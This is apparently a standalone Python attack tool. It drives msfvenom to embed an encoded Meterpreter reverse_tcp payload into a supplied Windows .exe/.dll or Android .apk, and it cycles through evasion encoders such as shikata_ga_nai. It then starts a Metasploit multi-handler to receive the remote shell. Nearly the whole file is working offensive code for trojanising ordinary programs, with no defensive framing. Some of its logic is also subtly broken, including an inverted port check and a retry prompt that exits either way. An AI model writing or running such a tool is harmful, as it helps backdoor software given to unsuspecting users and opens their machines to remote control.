import os
import subprocess
import sys

# Define supported executable formats and encoders
SUPPORTED_FORMATS = {
    ".exe": ("windows", "exe"),
    ".dll": ("windows", "dll"),
    ".apk": ("android", "apk")
}
DEFAULT_ENCODERS = [
    "x86/shikata_ga_nai",    # Excellent for x86
    "x64/zutto_dekiru",      # Good for x64 (if x86 fails)
    "cmd/powershell_base64", # Good for cmd/powershell payloads
    "generic/none"           # Fallback if all else fails
]
DEFAULT_PORT = 8083
LHOST = "0.0.0.0"  # Set LHOST to your listening IP address

def select_port(start_port=DEFAULT_PORT):
    port = start_port
    while True:
        if not subprocess.call(["lsof", "-i", f":{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL):
            port += 1
        else:
            return port

def create_msf_handler_script(payload, lport):
    """Creates a Metasploit resource script to start a multi-handler"""
    handler_script = f"""
    use exploit/multi/handler
    set PAYLOAD {payload}
    set LHOST {LHOST}
    set LPORT {lport}
    exploit -j
    """
    # Write to resource file
    script_path = "msf_handler.rc"
    with open(script_path, "w") as script_file:
        script_file.write(handler_script)
    return script_path

def encode_payload(file_path, output_name, platform, architecture):
    # Check file extension and corresponding platform/format
    _, file_extension = os.path.splitext(file_path)
    if file_extension not in SUPPORTED_FORMATS:
        print(f"Unsupported file type: {file_extension}. Supported types are {', '.join(SUPPORTED_FORMATS.keys())}.")
        return False

    # Get platform and output format for msfvenom
    expected_platform, output_format = SUPPORTED_FORMATS[file_extension]
    if platform != expected_platform:
        print(f"Invalid platform for {file_extension}. Expected: {expected_platform}.")
        return False

    # Define msfvenom command and initial setup
    payload = f"{platform}/{architecture}/meterpreter/reverse_tcp"
    output_file = f"{output_name}{file_extension}"
    lport = select_port()
    
    # Try each encoder in the list until one works
    for encoder in DEFAULT_ENCODERS:
        print(f"Trying encoder: {encoder}")
        command = [
            "msfvenom",
            "-p", payload,
            "-f", output_format,   
            "-e", encoder,
            "-i", "2",
 	    "-a", architecture,           # Adds the architecture option
    	    "--platform", platform,       # Specifies platform
    	    "-b", "\\x00", 
            "-n", "10",
            "-o", output_file,
            "-x", file_path,
            f"LPORT={lport}",
            f"LHOST={LHOST}"
        ]

        try:
            # Attempt to run msfvenom with the selected encoder
            subprocess.run(command, check=True)
            print(f"Payload injected successfully using encoder: {encoder}. Output file: {output_file}")
            
            # Create and launch the multi-handler
            handler_script = create_msf_handler_script(payload, lport)
            subprocess.run(["msfconsole", "-r", handler_script])
            return True
        except subprocess.CalledProcessError:
            print(f"Encoder {encoder} failed. Trying next encoder...")
    
    # If no encoder succeeded
    print("Failed to inject the payload with all available encoders.")
    return False

if __name__ == "__main__":
    # Indicate supported formats
    print("Supported executable formats: .exe (Windows), .dll (Windows), .apk (Android)")
    
    # Get user inputs
    file_path = input("Enter the path to the executable file to inject payload into: ")
    output_name = input("Enter the desired output file name (without extension): ")
    platform = input("Enter the platform (e.g., windows, android): ").strip().lower()
    architecture = input("Enter the architecture (e.g., x86, x64, armle): ").strip().lower()
    LHOST = input("Enter your IP address (IPv4 or IPv6): ")


    # Call encoding function
    if not encode_payload(file_path, output_name, platform, architecture):
        retry = input("Do you want to try again? (yes/no): ").strip().lower()
        if retry == 'yes':
            sys.exit(0)
        else:
            print("Exiting.")
            sys.exit(1)



